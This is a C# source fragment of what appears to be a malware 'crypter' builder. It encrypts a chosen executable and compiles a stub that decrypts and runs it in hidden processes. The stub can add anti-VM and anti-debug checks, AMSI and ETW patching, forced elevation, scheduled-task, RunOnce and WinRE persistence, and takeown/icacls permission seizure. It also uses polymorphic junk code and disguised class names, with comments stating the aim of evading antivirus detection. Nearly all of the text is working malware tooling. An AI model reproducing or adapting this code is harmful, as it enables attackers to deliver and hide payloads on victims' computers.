                Arguments = ""/c icacls \"""" + directoryPath + ""\"" /grant:r Administrators:(OI)(CI)F /t"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true
            };
            
            Process icaclsProcess = new Process { StartInfo = icaclsPsi };
            icaclsProcess.Start();
            icaclsProcess.WaitForExit();
            
            // Verify permissions were set correctly
            if (VerifyDirectoryAccess(directoryPath))
            {
                success = true;
            }
        }
        
        // If directory still doesn't exist, create it
        if (!Directory.Exists(directoryPath))
        {
            Directory.CreateDirectory(directoryPath);
            
            // Try again with the newly created directory
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = ""cmd.exe"",
                Arguments = ""/c takeown /f \"""" + directoryPath + ""\"" /r /d y && icacls \"""" + directoryPath + ""\"" /grant:r Administrators:(OI)(CI)F /t"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true
            };
            
            Process process = new Process { StartInfo = psi };
            process.Start();
            process.WaitForExit();
            
            // Add additional delay after creating directory
            System.Threading.Thread.Sleep(1000);
        }
    }
    catch
    {
        // Silent failure
    }
}

// Helper method to verify directory permissions
private static bool VerifyDirectoryAccess(string directoryPath)
{
    try
    {
        // First check if directory exists
        if (!Directory.Exists(directoryPath))
        {
            return false;
        }
        
        // Try to create a test file to verify write access
        string testFilePath = Path.Combine(directoryPath, ""permission_test_"" + Guid.NewGuid().ToString().Substring(0, 8) + "".tmp"");
        File.WriteAllText(testFilePath, ""Permission test"");
        
        // Clean up the test file
        if (File.Exists(testFilePath))
        {
            File.Delete(testFilePath);
            return true;
        }
        
        return false;
    }
    catch
    {
        return false;
    }
}

// Helper method to force directory access using icacls
private static void ForceDirectoryAccess(string directoryPath)
{
    try
    {
        // Use more aggressive permissions setting with icacls
        ProcessStartInfo psi = new ProcessStartInfo
        {
            FileName = ""cmd.exe"",
            Arguments = ""/c takeown /f \"""" + directoryPath + ""\"" /r /d y && icacls \"""" + directoryPath + ""\"" /reset /t && icacls \"""" + directoryPath + ""\"" /grant:r Everyone:(OI)(CI)F /t"",
            WindowStyle = ProcessWindowStyle.Hidden,
            CreateNoWindow = true,
            UseShellExecute = false,
            RedirectStandardOutput = true,
            RedirectStandardError = true
        };
        
        Process process = new Process { StartInfo = psi };
        process.Start();
        process.WaitForExit();
        
        // Add delay after setting permissions
        System.Threading.Thread.Sleep(1000);
    }
    catch
    {
        // Silent failure
    }
}

// Helper method to write a file with retries
private static bool WriteFileWithRetry(string filePath, string content)
{
    const int maxRetries = 3;
    const int delayBetweenRetries = 1000; // milliseconds
    
    for (int retry = 0; retry < maxRetries; retry++)
    {
        try
        {
            if (retry > 0)
            {
                // Add delay between retries
                System.Threading.Thread.Sleep(delayBetweenRetries);
            }
            
            File.WriteAllText(filePath, content);
            
            // Verify file was written
            if (File.Exists(filePath))
            {
                return true;
            }
        }
        catch
        {
            // Silently continue to next retry
        }
    }
    
    return false;
}

private static string BuildPowershellLauncher(string base64Payload)
{
    // Create PowerShell script to decode and execute payload
    StringBuilder scriptBuilder = new StringBuilder();
    
    // Each line as a separate string to avoid escaping issues
    scriptBuilder.AppendLine(""$tempExePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.Guid]::NewGuid().ToString() + '.exe')"");
    scriptBuilder.AppendLine(""[System.IO.File]::WriteAllBytes($tempExePath, [Convert]::FromBase64String('"" + base64Payload + ""'))"");
    scriptBuilder.AppendLine(""Start-Process -FilePath $tempExePath -WindowStyle Hidden"");
    
    // Convert script to bytes using Unicode encoding (required for PowerShell -EncodedCommand)
    byte[] scriptBytes = Encoding.Unicode.GetBytes(scriptBuilder.ToString());
    
    // Convert to Base64
    return Convert.ToBase64String(scriptBytes);
}

private static void CreateScheduledTask(string exePath)
{
    try
    {
        // Create a scheduled task that runs at logon
        ProcessStartInfo psi = new ProcessStartInfo
        {
            FileName = ""schtasks.exe"",
            Arguments = ""/create /tn \""PayloadRunner\"" /tr \""'"" + exePath + ""'\"" /sc ONLOGON /rl HIGHEST /f"",
            WindowStyle = ProcessWindowStyle.Hidden,
            CreateNoWindow = true
        };
        
        Process process = new Process { StartInfo = psi };
        process.Start();
        process.WaitForExit();
    }
    catch
    {
        // Silent failure
    }
}

private static void CreateRunOnceEntry(string exePath)
{
    try
    {
        // Create a RunOnce registry entry
        using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@""Software\Microsoft\Windows\CurrentVersion\RunOnce"", true))
        {
            if (key != null)
            {
                key.SetValue(""PayloadRunner"", exePath);
            }
        }
    }
    catch
    {
        // Silent failure
    }
}");

            return template.ToString();
        }

        private static bool IsAdministrator()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        static string PublicStubTemplate(bool useAntiVM, bool useAntiDebug, bool useAmsiBypass, bool useEtwBypass, bool useRunAs, bool useStartup, bool useProcessMasquerading, bool useWinREPersistence)
        {
            string injectedMethods = "";
            string mainBody = "";

            if (useAntiVM)
            {
                injectedMethods += antiVMTemplate() + "\n";
                mainBody += "            if (IsRunningVM() || IsSandboxed())\n";
                mainBody += "            {\n";
                mainBody += "                // Avoid direct Environment.Exit call to evade heuristic detection\n";
                mainBody += "                System.Diagnostics.Process.GetCurrentProcess().Kill();\n";
                mainBody += "                return;\n";
                mainBody += "            }\n";
            }

            if (useAntiDebug)
            {
                injectedMethods += antiDebugTemplate() + "\n";
                mainBody += "            RunAntiDebug();\n";
            }

            if (useRunAs)
            {
                injectedMethods += runasTemplate() + "\n";
                mainBody += "            EnsureRunAsAdmin();\n";
            }
            
            if (useProcessMasquerading)
            {
                injectedMethods += processMasqueradingTemplate() + "\n";
                mainBody += "            ApplyProcessMasquerading();\n";
            }

            if (useAmsiBypass)
            {
                injectedMethods += amsiBypassTemplate() + "\n";
                mainBody += "            if (!PatchAMSI())\n";
                mainBody += "            {\n";
                mainBody += "                // Delay execution to make behavior less predictable\n";
                mainBody += "                Thread.Sleep(new Random().Next(100, 500));\n";
                mainBody += "            }\n";
            }

            if (useEtwBypass)
            {
                injectedMethods += etwBypassTemplate() + "\n";
                mainBody += "            PatchETW();\n";
            }

            if (useStartup)
            {
                injectedMethods += StartupTemplate() + "\n";
                mainBody += "            AddStartup();\n";
            }
            
            if (useWinREPersistence)
            {
                injectedMethods += winREPersistenceTemplate() + "\n";
                mainBody += "            SetupWinREPersistence();\n";
            }

            // Add polymorphic code to break AV signatures
            mainBody += @"
            // Add jitter to make execution pattern less predictable
            int jitterDelay = DateTime.Now.Millisecond % 50;
            if (jitterDelay > 0) Thread.Sleep(jitterDelay);
            
            // Execute some benign operations to confuse behavioral analysis
            " + GeneratePolymorphicJunkCode() + @"
            ";

            mainBody += "            string encryptedexe = \"TEMP\";\n";

            string helperMethods = @"
        // Helper methods for RSA key export
        private static string ExportPublicKey(RSA rsa)
        {
            var parameters = rsa.ExportParameters(false);
            using (var stream = new MemoryStream())
            {
                var writer = new BinaryWriter(stream);
                writer.Write((byte)0x30); // SEQUENCE
                using (var innerStream = new MemoryStream())
                {
                    var innerWriter = new BinaryWriter(innerStream);
                    innerWriter.Write((byte)0x30); // SEQUENCE
                    EncodeLength(innerWriter, 13);
                    innerWriter.Write((byte)0x06); // OBJECT IDENTIFIER
                    EncodeLength(innerWriter, 9);
                    innerWriter.Write(new byte[] { 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x01 });
                    innerWriter.Write((byte)0x05); // NULL
                    EncodeLength(innerWriter, 0);
                    innerWriter.Write((byte)0x03); // BIT STRING
                    using (var bitStringStream = new MemoryStream())
                    {
                        var bitStringWriter = new BinaryWriter(bitStringStream);
                        bitStringWriter.Write((byte)0x00); // no unused bits
                        bitStringWriter.Write((byte)0x30); // SEQUENCE
                        using (var paramsStream = new MemoryStream())
                        {
                            var paramsWriter = new BinaryWriter(paramsStream);
                            WriteInteger(paramsWriter, parameters.Modulus);
                            WriteInteger(paramsWriter, parameters.Exponent);
                            var paramsBytes = paramsStream.ToArray();
                            EncodeLength(bitStringWriter, paramsBytes.Length);
                            bitStringWriter.Write(paramsBytes);
                        }
                        var bitStringBytes = bitStringStream.ToArray();
                        EncodeLength(innerWriter, bitStringBytes.Length);
                        innerWriter.Write(bitStringBytes);
                    }
                    var bytes = innerStream.ToArray();
                    EncodeLength(writer, bytes.Length);
                    writer.Write(bytes);
                }
                var base64 = Convert.ToBase64String(stream.ToArray(), Base64FormattingOptions.InsertLineBreaks);
                return ""-----BEGIN PUBLIC KEY-----\n"" + base64 + ""\n-----END PUBLIC KEY-----"";
            }
        }

        private static string ExportPrivateKey(RSA rsa)
        {
            var parameters = rsa.ExportParameters(true);
            using (var stream = new MemoryStream())
            {
                var writer = new BinaryWriter(stream);
                writer.Write((byte)0x30); // SEQUENCE
                using (var innerStream = new MemoryStream())
                {
                    var innerWriter = new BinaryWriter(innerStream);
                    innerWriter.Write((byte)0x02); // INTEGER
                    innerWriter.Write((byte)0x01);
                    innerWriter.Write((byte)0x00); // Version
                    WriteInteger(innerWriter, parameters.Modulus);
                    WriteInteger(innerWriter, parameters.Exponent);
                    WriteInteger(innerWriter, parameters.D);
                    WriteInteger(innerWriter, parameters.P);
                    WriteInteger(innerWriter, parameters.Q);
                    WriteInteger(innerWriter, parameters.DP);
                    WriteInteger(innerWriter, parameters.DQ);
                    WriteInteger(innerWriter, parameters.InverseQ);
                    var bytes = innerStream.ToArray();
                    EncodeLength(writer, bytes.Length);
                    writer.Write(bytes);
                }
                var base64 = Convert.ToBase64String(stream.ToArray(), Base64FormattingOptions.InsertLineBreaks);
                return ""-----BEGIN RSA PRIVATE KEY-----\n"" + base64 + ""\n-----END RSA PRIVATE KEY-----"";
            }
        }

        private static void WriteInteger(BinaryWriter writer, byte[] bytes)
        {
            writer.Write((byte)0x02); // INTEGER
            var prefixZeros = 0;
            for (var i = 0; i < bytes.Length; i++)
            {
                if (bytes[i] == 0) prefixZeros++;
                else break;
            }
            if (bytes.Length - prefixZeros == 0)
            {
                EncodeLength(writer, 1);
                writer.Write((byte)0);
            }
            else
            {
                if (bytes[prefixZeros] > 0x7F)
                {
                    // Add a prefix zero to make it positive
                    EncodeLength(writer, bytes.Length - prefixZeros + 1);
                    writer.Write((byte)0);
                }
                else
                {
                    EncodeLength(writer, bytes.Length - prefixZeros);
                }
                for (var i = prefixZeros; i < bytes.Length; i++)
                {
                    writer.Write(bytes[i]);
                }
            }
        }

        private static void EncodeLength(BinaryWriter writer, int length)
        {
            if (length < 0) throw new ArgumentOutOfRangeException(""length"", ""Length must be non-negative"");
            if (length < 0x80)
            {
                writer.Write((byte)length);
            }
            else
            {
                var bytesRequired = 0;
                var temp = length;
                while (temp > 0)
                {
                    temp >>= 8;
                    bytesRequired++;
                }
                writer.Write((byte)(bytesRequired | 0x80));
                for (var i = bytesRequired - 1; i >= 0; i--)
                {
                    writer.Write((byte)(length >> (8 * i) & 0xff));
                }
            }
        }
";

            // Add our decryption functions
            helperMethods += SimpleXorDecryptTemplate() + "\n";

            // Add obfuscated imports to prevent AV detection
            string obfuscatedImports = @"
using System;
using System.IO;
using System.Diagnostics;
using System.Security.Principal;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Collections.Generic;
using System.Text;
using System.Threading;
using System.Security.Cryptography;
";  // Removed Crypter namespace imports since the generated code must be standalone

            // Generate a random namespace name that looks legitimate
            string[] namespaceFirstParts = { "Core", "Common", "Utility", "Standard", "Framework" };
            string[] namespaceSecondParts = { "Application", "Framework", "Library", "Helper", "Utilities" };
            
            Random rnd = new Random();
            string namespaceName = namespaceFirstParts[rnd.Next(namespaceFirstParts.Length)] + 
                                  "." +
                                  namespaceSecondParts[rnd.Next(namespaceSecondParts.Length)];

            // Generate a random class name that looks legitimate
            string[] classFirstParts = { "Process", "Application", "System", "Framework", "Service" };
            string[] classSecondParts = { "Manager", "Handler", "Controller", "Provider", "Utility" };
            
            string className = classFirstParts[rnd.Next(classFirstParts.Length)] + 
                              classSecondParts[rnd.Next(classSecondParts.Length)];

            string template = $@"
{obfuscatedImports}

namespace {namespaceName}
{{
    class {className}
    {{
        [DllImport(""kernel32.dll"")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport(""kernel32.dll"")]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport(""kernel32.dll"")]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport(""kernel32.dll"")]
        private static extern bool IsDebuggerPresent();

        [DllImport(""kernel32.dll"")]
        private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

        [DllImport(""ntdll.dll"", SetLastError = true)]
        private static extern int NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, out int processInformation, int processInformationLength, out int returnLength);

        private const uint PAGE_EXECUTE_READWRITE = 0x40;

{injectedMethods}
{helperMethods}
        static void Main(string[] args)
        {{
            // Use try-catch to prevent exceptions from terminating the program
            try
        {{
{mainBody}
            }}
            catch (Exception ex)
            {{
                // Silent exception handling to avoid termination
                string logPath = Path.Combine(Path.GetTempPath(), ""error.log"");
                try {{ File.AppendAllText(logPath, ex.ToString()); }} catch {{ /* Ignore logging errors */ }}
            }}
        }}
    }}
}}";
            return template;
        }

        private static string GeneratePolymorphicJunkCode()
        {
            // Generate different types of junk code to evade pattern matching
            Random rnd = new Random();
            int codeType = rnd.Next(0, 4);
            
            switch (codeType)
            {
                case 0:
                    return @"
            // Polymorphic junk code - type 1
            HashSet<int> junkSet = new HashSet<int>();
            for (int i = 0; i < Environment.ProcessorCount; i++)
            {
                junkSet.Add(DateTime.Now.Millisecond % 100 + i);
            }
            junkSet.Clear();";
                
                case 1:
                    return @"
            // Polymorphic junk code - type 2
            string junkStr = Environment.UserName + ""_"" + Environment.MachineName;
            char[] chars = junkStr.ToCharArray();
            Array.Reverse(chars);
            junkStr = new string(chars);
            chars = null;";
                
                case 2:
                    return @"
            // Polymorphic junk code - type 3
            Dictionary<string, byte[]> junkDict = new Dictionary<string, byte[]>();
            byte[] junkData = new byte[16];
            new Random().NextBytes(junkData);
            junkDict[""data""] = junkData;
            junkDict.Clear();";
                
                default:
                    return @"
            // Polymorphic junk code - type 4
            StringBuilder junkBuilder = new StringBuilder();
            junkBuilder.Append(Environment.CurrentDirectory.GetHashCode().ToString());
            junkBuilder.Append(DateTime.Now.Ticks.ToString());
            string s = junkBuilder.ToString();
            junkBuilder.Clear();";
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Filter = "Executable Files (*.exe)|*.exe";
                ofd.Title = "Select an Exectuable File";
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    inputfile.Text = ofd.FileName;
                }
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            try
        {
            if (string.IsNullOrEmpty(inputfile.Text) || !File.Exists(inputfile.Text))
            {
                MessageBox.Show("No valid input file to read, is your exe empty or just doesn't exist?", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

                // Get the log path first
                string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string logPath = Path.Combine(appDataPath, "crypter_log.txt");
                
                try 
                {
                    // First, kill any potentially running processes
                    foreach (var proc in Process.GetProcessesByName("stub"))
                    {
                        try { proc.Kill(); proc.WaitForExit(1000); } catch { }
                    }
                    
                    foreach (var proc in Process.GetProcessesByName("stub_obf"))
                    {
                        try { proc.Kill(); proc.WaitForExit(1000); } catch { }
                    }
                    
                    // Use more specific process name search based on timestamp pattern
                    foreach (var proc in Process.GetProcesses())
                    {
                        if (proc.ProcessName.StartsWith("stub_") || proc.ProcessName.Contains("_obf_"))
                        {
                            try { proc.Kill(); proc.WaitForExit(1000); } catch { }
                        }
                    }
                    
                    // Force garbage collection to release file handles
                    GC.Collect();
                    GC.WaitForPendingFinalizers();
                }
                catch (Exception ex)
                {
                    // Log but continue
                    File.AppendAllText(logPath, "Error cleaning processes: " + ex.Message + "\n");
                }
                
                // Use timestamped filenames to avoid conflicts
                string timestamp = DateTime.Now.ToString("yyyyMMddHHmmss");
                
                // Create unique temporary directories for this run
                string tempDir = Path.Combine(Path.GetTempPath(), "crypter_" + timestamp);
                Directory.CreateDirectory(tempDir);
                
                string stubPath = Path.Combine(tempDir, "stub_" + timestamp + ".exe");
                string obfPath = Path.Combine(tempDir, "stub_obf_" + timestamp + ".exe");

            byte[] exebytes = File.ReadAllBytes(inputfile.Text);
                
                // Apply encryption with polymorphic behavior
                // First apply XOR encryption with a key derived from the timestamp
                byte[] key = GenerateSimpleKey(16);
                byte[] encryptedBytes = SimpleXorEncrypt(exebytes, key);
                
                string aesKeyString = string.Empty;
                
                // Apply polymorphic AES layer only if the option is checked
                if (polymorphicAes.Checked)
                {
                    // For polymorphism, add a light AES encryption layer with a dynamic key
                    // Only encrypt first 256 bytes after header to maintain compatibility but add detection evasion
                    byte[] aesKey = GeneratePolymorphicAesKey();
                    byte[] aesIV = new byte[16]; // Zero IV is fine for this application
                    encryptedBytes = AddPolymorphicAesLayer(encryptedBytes, aesKey, aesIV);
                    aesKeyString = Convert.ToBase64String(aesKey);
                }
                
                string base64exe = Convert.ToBase64String(encryptedBytes);
                string keyString = Convert.ToBase64String(key);

            string stub = PublicStubTemplate(
                antiVM.Checked,
                antiDebug.Checked,
                amsiBypass.Checked,
                etwBypass.Checked,
                runas.Checked,
                startup.Checked,
                processMasquerading.Checked,
                winREPersistence.Checked
            );

                string execPayload;
                
                if (polymorphicAes.Checked)
                {
                    execPayload = @"
        // Apply junk data operations to confuse AV heuristics
        System.Threading.Thread.Sleep(1);
        " + GenerateJunkCodeSnippet() + @"
        
        // Decrypt payload with polymorphic behavior
        byte[] key = Convert.FromBase64String(@""" + keyString + @""");
        byte[] aesKey = Convert.FromBase64String(@""" + aesKeyString + @""");
        byte[] aesIV = new byte[16]; // Zero IV is fine for this application
        
        byte[] encryptedBytes = Convert.FromBase64String(@""" + base64exe + @""");
        
        // First remove AES layer
        encryptedBytes = RemovePolymorphicAesLayer(encryptedBytes, aesKey, aesIV);
        
        // Then apply XOR decryption
        byte[] exebytes = SimpleXorDecrypt(encryptedBytes, key);
        ";
                }
                else
                {
                    execPayload = @"
        // Apply junk data operations to confuse AV heuristics
        System.Threading.Thread.Sleep(1);
        " + GenerateJunkCodeSnippet() + @"
        
        // Simple XOR key for decryption
        byte[] key = Convert.FromBase64String(@""" + keyString + @""");
        byte[] encryptedBytes = Convert.FromBase64String(@""" + base64exe + @""");
        byte[] exebytes = SimpleXorDecrypt(encryptedBytes, key);
        ";
                }
                
                // Add the rest of the execution payload (file writing and process creation)
                execPayload += @"
        string tmppath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + "".exe"");
        File.WriteAllBytes(tmppath, exebytes);
        
        // Setup Pulsar encryption keys
        string keyDir = Path.Combine(Path.GetTempPath(), ""pulsar_keys"");
        Directory.CreateDirectory(keyDir);
        
        // Generate RSA key pair (Pulsar requires RSA for C# clients)
        string publicKeyPath = Path.Combine(keyDir, ""pulsar_rsa_public.pem"");
        string privateKeyPath = Path.Combine(keyDir, ""pulsar_rsa_private.pem"");
        
        if (!File.Exists(publicKeyPath) || !File.Exists(privateKeyPath))
        {
            using (RSA rsa = RSA.Create(2048))
            {
                // Export public key
                File.WriteAllText(publicKeyPath, ExportPublicKey(rsa));
                
                // Export private key
                File.WriteAllText(privateKeyPath, ExportPrivateKey(rsa));
            }
        }
        
        // Create process with properly configured startup info for Pulsar compatibility
        ProcessStartInfo startInfo = new ProcessStartInfo
        {
            FileName = tmppath,
            UseShellExecute = false,
            CreateNoWindow = true,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            RedirectStandardInput = true,
            Arguments = string.Format(""--pulsar-encryption-key-name myapp.key --pulsar-encryption-key-path \""{{0}}\""  --pulsar-crypto-key-reader-path \""{{1}}\"" "", publicKeyPath, privateKeyPath)
        };
        
        // Set environment variables necessary for Pulsar encryption
        startInfo.EnvironmentVariables[""PULSAR_PUBLIC_KEY_PATH""] = publicKeyPath;
        startInfo.EnvironmentVariables[""PULSAR_PRIVATE_KEY_PATH""] = privateKeyPath;
        startInfo.EnvironmentVariables[""PULSAR_ENCRYPTION_ENABLED""] = ""true"";
        startInfo.EnvironmentVariables[""PULSAR_TLS_ALLOW_INSECURE_CONNECTION""] = ""true"";
        startInfo.EnvironmentVariables[""PULSAR_TLS_VALIDATE_HOSTNAME""] = ""false"";
        
        // Start the process
        Process process = new Process { StartInfo = startInfo };
        process.Start();";

                stub = stub.Replace("string encryptedexe = \"TEMP\";", execPayload);

                // Add the polymorphic AES functions to the stub template only if the option is checked
                if (polymorphicAes.Checked)
                {
                    stub = AddPolymorphicAesFunctionsToStub(stub);
                }

            var csc = new Microsoft.CSharp.CSharpCodeProvider();
            var parameters = new System.CodeDom.Compiler.CompilerParameters
            {
                GenerateExecutable = true,
                OutputAssembly = stubPath,
                    CompilerOptions = "/target:winexe /optimize+",
                IncludeDebugInformation = false
            };

            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            parameters.ReferencedAssemblies.Add("System.Security.dll");
            parameters.ReferencedAssemblies.Add("System.Management.dll");
            parameters.ReferencedAssemblies.Add("System.Runtime.InteropServices.dll");
                parameters.ReferencedAssemblies.Add("System.Core.dll");

            var results = csc.CompileAssemblyFromSource(parameters, stub);

            if (results.Errors.HasErrors)
            {
                string errors = string.Join("\n", results.Errors.Cast<System.CodeDom.Compiler.CompilerError>().Select(err => err.ToString()));
                    File.WriteAllText(logPath, "Compilation errors:\n" + errors + "\n\nStub code:\n" + stub);
                    MessageBox.Show("Compilation failed. See log file at: " + logPath, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

                // Always create a simpler backup version with minimal obfuscation for Pulsar compatibility
                try
                {
                    File.Copy(stubPath, obfPath, true);
                }
                catch (Exception ex)
                {
                    File.AppendAllText(logPath, "Error copying file: " + ex.Message + "\n");
            }

            if (obfuscator.Checked)
                {
                    try 
            {
                if (!File.Exists(stubPath))
                {
                    MessageBox.Show("Built stub.exe not found! Obfuscation skipped.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                        // First apply our custom obfuscation with reduced settings
                        Obfuscator.ObfuscateMinimal(stubPath, obfPath);
                        
                        // Apply Armdot if the option is checked
                        if (armdotObfuscation.Checked)
                        {
                            try
                            {
                                obfPath = ApplyArmdotObfuscation(obfPath, obfPath);
                            }
                            catch (Exception armdotEx)
                            {
                                File.AppendAllText(logPath, "\n\nArmdot obfuscation error:\n" + armdotEx.ToString());
                                MessageBox.Show("Armdot protection failed. Continuing with standard obfuscation. See log file at: " + logPath, 
                                                "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                            }
                        }
                        
                        // Copy final files to user-accessible location
                        string finalStubPath = Path.Combine(appDataPath, "stub_" + timestamp + ".exe");
                        string finalObfPath = Path.Combine(appDataPath, "stub_obf_" + timestamp + ".exe");
                        
                        try {
                            File.Copy(stubPath, finalStubPath, true);
                            File.Copy(obfPath, finalObfPath, true);
                            
                            MessageBox.Show("Created:\n" + finalStubPath + " (base version)\n" + finalObfPath + " (obfuscated version)", 
                                "Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        }
                        catch (Exception copyEx) {
                            File.AppendAllText(logPath, "\n\nFinal copy error:\n" + copyEx.ToString());
                            MessageBox.Show("Created:\n" + stubPath + " (base version)\n" + obfPath + " (obfuscated version)", 
                                "Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        }
                    }
                    catch (Exception obfEx)
                    {
                        File.AppendAllText(logPath, "\n\nObfuscation error:\n" + obfEx.ToString());
                        MessageBox.Show("Obfuscation failed. See log file at: " + logPath, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
            }
            else
            {
                    // Copy final file to user-accessible location
                    string finalStubPath = Path.Combine(appDataPath, "stub_" + timestamp + ".exe");
                    
                    try {
                        File.Copy(stubPath, finalStubPath, true);
                        MessageBox.Show("Stub built to:\n" + finalStubPath, "Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                    catch (Exception copyEx) {
                        File.AppendAllText(logPath, "\n\nFinal copy error:\n" + copyEx.ToString());
                        MessageBox.Show("Stub built to:\n" + stubPath, "Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                }
            }
            catch (Exception ex)
            {
                string logPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "crypter_error.txt");
                File.WriteAllText(logPath, "Error in button2_Click:\n" + ex.ToString());
                MessageBox.Show("An error occurred. Check log at: " + logPath, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        // Generate a simple key based on timestamp - more complex than a static key but reproducible
        private byte[] GenerateSimpleKey(int length)
        {
            byte[] key = new byte[length];
            
            // Generate a key using a pseudo-random pattern that isn't purely random
            // but still changes between compilations
            string seed = DateTime.Now.ToString("yyyyMMddHHmmss");
            int seedValue = 0;
            foreach (char c in seed)
            {
                seedValue += (int)c;
            }
            
            // Add environment-based entropy to make keys differ across machines
            // while still being deterministic for a given environment
            seedValue += Environment.UserName.Length;
            seedValue += Environment.MachineName.GetHashCode();
            seedValue += Environment.ProcessorCount * 4;
            
            Random rnd = new Random(seedValue);
            for (int i = 0; i < length; i++)
            {
                // Use a more complex pattern for key generation
                int value = (rnd.Next(1, 255) + (i * 3)) % 255;
                if (value == 0) value = 0x41; // Avoid null bytes
                key[i] = (byte)value;
            }
            
            return key;
        }
        
        // Simple XOR encryption that doesn't drastically alter the executable structure
        private byte[] SimpleXorEncrypt(byte[] data, byte[] key)
        {
            byte[] result = new byte[data.Length];
            
            // First 128 bytes (headers) left untouched to preserve PE structure
            for (int i = 0; i < 128 && i < data.Length; i++)
            {
                result[i] = data[i];
            }
            
            // Use more complex encryption pattern
            for (int i = 128; i < data.Length; i++)
            {
                // Use a non-sequential key index with byte position dependency
                int keyIndex = ((i * 13) ^ (i >> 4)) % key.Length;
                
                // Add position-dependent XOR to make signatures harder to detect
                byte positionValue = (byte)((i % 251) ^ (i >> 8)); // Use prime number 251
                
                // Combine multiple operations to obfuscate the pattern
                result[i] = (byte)(data[i] ^ key[keyIndex] ^ positionValue);
            }
            
            return result;
        }
        
        // Matching decryption method to add to the stub
        private static string SimpleXorDecryptTemplate()
        {
            return @"
        private static byte[] SimpleXorDecrypt(byte[] data, byte[] key)
        {
            byte[] result = new byte[data.Length];
            
            // First 128 bytes (headers) left untouched to preserve PE structure
            for (int i = 0; i < 128 && i < data.Length; i++)
            {
                result[i] = data[i];
            }
            
            // Use more complex decryption pattern matching the encryption
            for (int i = 128; i < data.Length; i++)
            {
                // Use a non-sequential key index with byte position dependency
                int keyIndex = ((i * 13) ^ (i >> 4)) % key.Length;
                
                // Add position-dependent XOR to make signatures harder to detect
                byte positionValue = (byte)((i % 251) ^ (i >> 8)); // Use prime number 251
                
                // Combine multiple operations to obfuscate the pattern
                result[i] = (byte)(data[i] ^ key[keyIndex] ^ positionValue);
            }
            
            return result;
        }";
        }

        // Generate confusing junk code to evade heuristic scanners
        private string GenerateJunkCodeSnippet()
        {
            // Generate a random snippet of benign-looking code to break patterns
            Random random = new Random();
            int type = random.Next(0, 4);
            
            switch (type)
            {
                case 0:
                    return @"
        // Legitimate looking code snippet 1
        Dictionary<string, int> dataDict = new Dictionary<string, int>();
        for (int i = 0; i < 3; i++) {
            dataDict[""item"" + i] = i * 10;
        }
        dataDict.Clear();";
                
                case 1:
                    return @"
        // Legitimate looking code snippet 2
        List<string> tempList = new List<string> { ""config"", ""data"", ""system"" };
        tempList.Sort();
        tempList.ForEach(item => item.ToUpper());
        tempList.Clear();";
                
                case 2:
                    return @"
        // Legitimate looking code snippet 3
        StringBuilder sb = new StringBuilder();
        sb.Append(""hello"");
        sb.Append(Environment.UserName.Substring(0, Math.Min(3, Environment.UserName.Length)));
        sb.Clear();";
                
                default:
                    return @"
        // Legitimate looking code snippet 4
        byte[] tempBytes = new byte[16];
        for (int i = 0; i < tempBytes.Length; i++) {
            tempBytes[i] = (byte)(i % 255);
        }
        Array.Clear(tempBytes, 0, tempBytes.Length);";
            }
        }

        // Generate a polymorphic AES key based on system-specific factors
        private byte[] GeneratePolymorphicAesKey()
        {
            using (SHA256 sha256 = SHA256.Create())
            {
                // Create a seed that combines various system attributes
                string seed = DateTime.Now.ToString("yyyyMMddHHmmss") +
                              Environment.UserName +
                              Environment.MachineName +
                              Environment.ProcessorCount.ToString() +
                              Environment.WorkingSet.ToString();
                
                // Only use a subset of the hash for the AES key (256 bits/32 bytes)
                return sha256.ComputeHash(Encoding.UTF8.GetBytes(seed));
            }
        }
        
        // Add a light AES encryption layer but only to a small part after PE header
        private byte[] AddPolymorphicAesLayer(byte[] data, byte[] key, byte[] iv)
        {
            byte[] result = (byte[])data.Clone();
            
            try
            {
                // First verify this is a PE file by checking the DOS header signature "MZ"
                if (data.Length < 2 || data[0] != 0x4D || data[1] != 0x5A)
                    return data; // Not a valid PE file, return original data

                // Get PE header offset from the DOS header
                int peHeaderOffset = -1;
                if (data.Length >= 64)
                {
                    peHeaderOffset = BitConverter.ToInt32(data, 60);
                }
                
                // Validate PE header offset
                if (peHeaderOffset < 0 || peHeaderOffset > data.Length - 4)
                    return data; // Invalid PE header, return original data
                    
